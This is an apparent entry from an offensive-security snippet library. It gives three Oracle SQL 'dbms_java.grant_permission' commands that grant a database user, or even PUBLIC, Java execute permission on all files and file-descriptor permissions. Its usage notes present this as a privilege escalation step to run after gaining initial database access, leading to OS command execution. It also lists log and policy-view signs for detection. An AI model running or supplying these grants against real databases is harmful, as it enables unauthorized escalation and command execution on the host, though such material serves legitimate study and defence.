---
id: ca61b053-3596-46f0-b8ed-f4ba39e71c00
name: grant-java-file-and-runtime-permissions
type: code
language: sql
verified: true
created_at: '2023-04-06T03:56:35.305118+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Oracle Database
tags:
  - oracle
  - java
  - permissions
  - escalation
validated: true
---

# grant-java-file-and-runtime-permissions

## Code

```sql
exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute');
exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
```

## Description

This code grants essential Java permissions for file execution and I/O operations to a specified user, enabling subsequent OS command execution through Java in Oracle databases.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 'SCOTT' | Target username; replace with desired user | 'PUBLIC' |

## Usage

Run after gaining initial DB access to escalate Java privileges. Follow with policy queries to verify, then proceed to command execution snippets.

## Detection

- Logs of DBMS_JAVA.GRANT_PERMISSION executions.
- Changes in JAVA_POLICY views post-execution.

## Related

- [[procedures/Oracle-SQL-and-Java-Command-Execution]]
